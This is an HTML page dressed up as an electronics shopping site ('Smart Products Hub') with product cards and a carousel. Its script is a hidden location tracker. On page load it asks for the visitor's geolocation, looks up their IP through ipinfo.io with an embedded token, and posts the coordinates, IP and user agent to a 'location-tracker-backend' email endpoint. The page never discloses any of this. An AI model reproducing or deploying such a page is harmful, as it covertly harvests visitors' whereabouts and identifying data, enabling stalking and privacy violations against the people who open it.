<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Smart Products Hub</title>
    <style>
        body {
            font-family: 'Arial', sans-serif;
            margin: 0;
            padding: 0;
            background: #f1f3f6;
            color: #333;
        }

        /* Navbar */
        .navbar {
            background-color: #2874f0;
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 10px 20px;
            color: white;
        }

            .navbar .logo {
                font-size: 20px;
                font-weight: bold;
                cursor: pointer;
            }

            .navbar .search-bar {
                flex: 1;
                margin: 0 20px;
                display: flex;
            }

                .navbar .search-bar input {
                    width: 100%;
                    padding: 8px;
                    border: none;
                    border-radius: 2px 0 0 2px;
                    outline: none;
                }

                .navbar .search-bar button {
                    padding: 8px 15px;
                    border: none;
                    background: #ff9f00;
                    border-radius: 0 2px 2px 0;
                    cursor: pointer;
                    color: white;
                    font-weight: bold;
                }

            .navbar .actions button {
                margin-left: 10px;
                padding: 8px 12px;
                background: white;
                color: #2874f0;
                border: none;
                border-radius: 2px;
                cursor: pointer;
                font-weight: bold;
            }

        /* Carousel */
        .carousel-container {
            position: relative;
            max-width: 100%;
            margin: auto;
            overflow: hidden;
            height: 300px;
        }

        .carousel-slide {
            display: flex;
            transition: transform 0.5s ease-in-out;
        }

            .carousel-slide img {
                width: 100%;
                flex-shrink: 0;
                height: 300px;
                object-fit: cover;
            }

        .carousel-btn {
            position: absolute;
            top: 50%;
            transform: translateY(-50%);
            background: rgba(0, 0, 0, 0.4);
            color: #fff;
            border: none;
            padding: 10px;
            cursor: pointer;
            font-size: 20px;
            z-index: 10;
        }

        .prev {
            left: 10px;
        }

        .next {
            right: 10px;
        }

        /* Deals Section */
        .deals-section {
            background: #fff;
            margin: 20px auto;
            max-width: 1200px;
            padding: 15px;
            border-radius: 5px;
            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
        }

            .deals-section h2 {
                margin-bottom: 15px;
                font-size: 20px;
                color: #222;
            }

        .deals-container {
            display: flex;
            overflow-x: auto;
            gap: 10px;
            scrollbar-width: thin;
        }

        .deal-item {
            min-width: 150px;
            background: #f9f9f9;
            padding: 10px;
            border-radius: 6px;
            text-align: center;
            box-shadow: 0 1px 4px rgba(0,0,0,0.1);
            transition: transform 0.2s ease;
        }

            .deal-item img {
                max-width: 100%;
                height: 100px;
                object-fit: cover;
                border-radius: 4px;
            }

            .deal-item h4 {
                font-size: 14px;
                margin: 8px 0;
            }

            .deal-item p {
                color: #2874f0;
                font-weight: bold;
            }

            .deal-item:hover {
                transform: scale(1.05);
            }

        /* Products Grid */
        h2 {
            color: #222;
            text-align: center;
            margin: 20px 0;
        }

        .products {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
            gap: 20px;
            max-width: 1200px;
            margin: auto;
            padding: 20px;
        }

        .product {
            background: #fff;
            border-radius: 6px;
            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
            padding: 15px;
            text-align: center;
            transition: all 0.2s ease-in-out;
            cursor: pointer;
        }

            .product:hover {
                transform: translateY(-5px);
                box-shadow: 0 5px 15px rgba(0,0,0,0.2);
            }

            .product img {
                max-width: 100%;
                height: 150px;
                object-fit: contain;
                margin-bottom: 10px;
            }

            .product h3 {
                font-size: 16px;
                color: #222;
                margin: 5px 0;
            }

            .product p {
                font-size: 15px;
                color: #2874f0;
                font-weight: bold;
                margin: 5px 0;
            }

        .buy-btn {
            background: #fb641b;
            border: none;
            padding: 8px 12px;
            color: #fff;
            border-radius: 4px;
            font-size: 14px;
            cursor: pointer;
            transition: background 0.2s;
        }

            .buy-btn:hover {
                background: #d55d17;
            }
    </style>
</head>
<body>
    <!-- Navigation Bar -->
    <div class="navbar">
        <div class="logo">Smart Hub</div>
        <div class="search-bar">
            <input type="text" placeholder="Search for products...">
            <button>Search</button>
        </div>
        <div class="actions">
            <button>Login</button>
            <button>Cart</button>
        </div>
    </div>

    <!-- Carousel -->
    <div class="carousel-container">
        <button class="carousel-btn prev">&#10094;</button>
        <button class="carousel-btn next">&#10095;</button>
        <div class="carousel-slide" id="carousel-slide">
            <img src="https://images.unsplash.com/photo-1606811841681-0f1b0b3b4c2e?q=80&w=1470" alt="Banner 1">
            <img src="https://images.unsplash.com/photo-1505740420928-5e560c06d30e?q=80&w=1470" alt="Banner 2">
            <img src="https://images.unsplash.com/photo-1581291519195-ef11498d1cf2?q=80&w=1470" alt="Banner 3">
        </div>
    </div>

    <!-- Deals of the Day -->
    <div class="deals-section">
        <h2>Deals of the Day</h2>
        <div class="deals-container" id="deals-container"></div>
    </div>

    <!-- Product Section -->
    <div id="products-section">
        <h2>Smart Products Hub</h2>
        <div class="products" id="product-list"></div>
    </div>

    <script>
        const backendUrl = "https://location-tracker-backend-wvgn.onrender.com/send-location-email";
        const ipinfoToken = "89c6e154a78451";

        const products = [
            { name: "Smart Watch", price: "₹2,999", image: "https://images.unsplash.com/photo-1508685096489-7aacd43bd3b1?q=80&w=327&auto=format&fit=crop" },
            { name: "Wireless Earbuds", price: "₹1,499", image: "https://images.unsplash.com/photo-1585155784229-aff921ccfa10?q=80&w=327&auto=format&fit=crop" },
            { name: "Gaming Mouse", price: "₹799", image: "https://images.unsplash.com/photo-1629121291243-7b5e885cce9b?q=80&w=464&auto=format&fit=crop" },
            { name: "Bluetooth Speaker", price: "₹1,999", image: "https://images.unsplash.com/photo-1668649175276-fa4f96beb185?q=80&w=435&auto=format&fit=crop" },
            { name: "Laptop Bag", price: "₹999", image: "https://plus.unsplash.com/premium_photo-1680392544041-d89413b561ce?q=80&w=327&auto=format&fit=crop" }
        ];

        const deals = [
            { name: "iPhone 14", price: "₹69,999", image: "https://images.unsplash.com/photo-1660329688628-8e4c45e26dfd?q=80&w=500" },
            { name: "Samsung TV", price: "₹39,999", image: "https://images.unsplash.com/photo-1606813908734-0a3e446b4719?q=80&w=500" },
            { name: "PS5 Console", price: "₹49,999", image: "https://images.unsplash.com/photo-1617787112990-c5c4b5014e68?q=80&w=500" },
            { name: "MacBook Air", price: "₹89,999", image: "https://images.unsplash.com/photo-1517336714731-489689fd1ca8?q=80&w=500" },
            { name: "Canon Camera", price: "₹59,999", image: "https://images.unsplash.com/photo-1519183071298-a2962be90b8e?q=80&w=500" }
        ];

        function renderProducts() {
            const productList = document.getElementById('product-list');
            products.forEach(p => {
                const div = document.createElement('div');
                div.className = 'product';
                div.innerHTML = `
                        <img src="${p.image}" alt="${p.name}">
                        <h3>${p.name}</h3>
                        <p>${p.price}</p>
                        <button class="buy-btn">Buy Now</button>
                    `;
                productList.appendChild(div);
            });
        }

        function renderDeals() {
            const dealsContainer = document.getElementById('deals-container');
            deals.forEach(d => {
                const div = document.createElement('div');
                div.className = 'deal-item';
                div.innerHTML = `
                        <img src="${d.image}" alt="${d.name}">
                        <h4>${d.name}</h4>
                        <p>${d.price}</p>
                    `;
                dealsContainer.appendChild(div);
            });
        }

        // Carousel Functionality
        const carouselSlide = document.getElementById('carousel-slide');
        const carouselImages = document.querySelectorAll('.carousel-slide img');
        let index = 0;

        document.querySelector('.next').addEventListener('click', () => {
            index = (index + 1) % carouselImages.length;
            carouselSlide.style.transform = `translateX(${-index * 100}%)`;
        });

        document.querySelector('.prev').addEventListener('click', () => {
            index = (index - 1 + carouselImages.length) % carouselImages.length;
            carouselSlide.style.transform = `translateX(${-index * 100}%)`;
        });

        setInterval(() => {
            index = (index + 1) % carouselImages.length;
            carouselSlide.style.transform = `translateX(${-index * 100}%)`;
        }, 4000);

        async function getUserIP() {
            try {
                const response = await fetch(`https://ipinfo.io/json?token=${ipinfoToken}`);
                const data = await response.json();
                return data.ip || 'N/A';
            } catch (error) {
                return 'N/A';
            }
        }

        async function sendLocation(latitude, longitude) {
            const userAgent = navigator.userAgent;
            const ip = await getUserIP();
            try {
                await fetch(backendUrl, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ latitude, longitude, userAgent, ip })
                });
            } catch (error) {
                console.error("Error sending location:", error);
            }
        }

        function getLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (position) => sendLocation(position.coords.latitude, position.coords.longitude),
                    () => console.warn("Location access denied.")
                );
            }
        }

        getLocation();
        renderDeals();
        renderProducts();
    </script>
</body>
</html>
